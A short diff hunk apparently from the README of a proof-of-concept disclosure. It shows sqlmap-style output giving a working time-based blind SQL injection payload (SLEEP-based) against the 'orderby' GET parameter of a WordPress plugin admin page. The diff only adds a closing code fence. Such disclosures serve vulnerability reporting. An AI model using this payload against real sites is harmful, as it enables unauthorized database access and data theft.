@@ -48,5 +48,6 @@ Parameter: orderby (GET)
     Payload: page=tsvg-admin&orderby=TS_VG_Title AND (SELECT 6127 FROM (SELECT(SLEEP(5)))mIWx)&order=desc
     Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
 ---
+```
 
 <img alt="Result" src="https://raw.github.com/capture0x/Poll-Plugin-SQL-Injection-/main/2.png">
